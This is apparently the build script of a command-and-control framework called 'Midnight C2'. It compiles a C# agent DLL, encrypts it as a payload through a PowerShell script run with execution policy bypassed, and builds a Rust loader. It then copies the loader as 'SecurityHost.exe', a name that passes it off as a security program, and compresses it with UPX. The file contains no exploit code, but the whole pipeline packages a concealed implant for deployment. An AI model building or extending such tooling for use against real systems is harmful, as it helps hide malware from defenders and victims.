@echo off
setlocal enabledelayedexpansion

echo ========================================================
echo             Midnight C2 - Automated Build Script
echo ========================================================
echo.

:: Force static CRT linking - fixes VCRUNTIME140.dll not found error
set RUSTFLAGS=-C target-feature=+crt-static

:: Step 1: Build the C# agent DLL
echo [*] Step 1: Compiling MidnightAgent DLL...
dotnet build MidnightAgent\MidnightAgent.csproj -c Release
if %ERRORLEVEL% neq 0 (
    echo [!] Error: Failed to compile MidnightAgent DLL!
    goto error
)
echo [+] MidnightAgent DLL compiled successfully.
echo.

:: Step 2: Encrypt the DLL payload
echo [*] Step 2: Encrypting MidnightAgent.dll...
powershell.exe -ExecutionPolicy Bypass -File MidnightLoader\encrypt_payload.ps1
if %ERRORLEVEL% neq 0 (
    echo [!] Error: Failed to encrypt payload!
    goto error
)
echo [+] Payload encrypted successfully.
echo.

:: Step 3: Clean old Rust cache and rebuild with static CRT
echo [*] Step 3: Cleaning Rust cache...
cargo clean --manifest-path MidnightLoader\Cargo.toml
if %ERRORLEVEL% neq 0 (
    echo [!] Error: Failed to clean Rust cache!
    goto error
)
echo [+] Rust cache cleaned.
echo.

echo [*] Step 3b: Compiling MidnightLoader (Rust, static CRT)...
cargo build --manifest-path MidnightLoader\Cargo.toml --release --target x86_64-pc-windows-gnu
if %ERRORLEVEL% neq 0 (
    echo [!] Error: Failed to compile MidnightLoader!
    goto error
)
echo [+] MidnightLoader compiled successfully.
echo.

:: Step 4: Copy outputs
echo [*] Step 4: Packaging and copying outputs...
if not exist "Output" mkdir "Output"

copy "MidnightLoader\target\x86_64-pc-windows-gnu\release\midnight_loader.exe" "midnight_loader.exe" /Y
if %ERRORLEVEL% neq 0 (
    echo [!] Error: Failed to copy to root directory!
    goto error
)

copy "MidnightLoader\target\x86_64-pc-windows-gnu\release\midnight_loader.exe" "Output\SecurityHost.exe" /Y
if %ERRORLEVEL% neq 0 (
    echo [!] Error: Failed to copy to Output directory!
    goto error
)

:: Step 5: Compress outputs with UPX
echo [*] Step 5: Compressing output binaries using UPX...
if exist "MidnightLoader\upx.exe" (
    "MidnightLoader\upx.exe" --best "midnight_loader.exe"
    "MidnightLoader\upx.exe" --best "Output\SecurityHost.exe"
) else (
    echo [!] Warning: upx.exe not found at MidnightLoader\upx.exe, skipping compression.
)

echo.
echo ========================================================
echo  SUCCESS! Build complete!
echo  - Output 1: midnight_loader.exe
echo  - Output 2: Output\SecurityHost.exe
echo ========================================================
pause
exit /b 0

:error
echo.
echo [x] BUILD FAILED! Please check the error logs above.
pause
exit /b 1
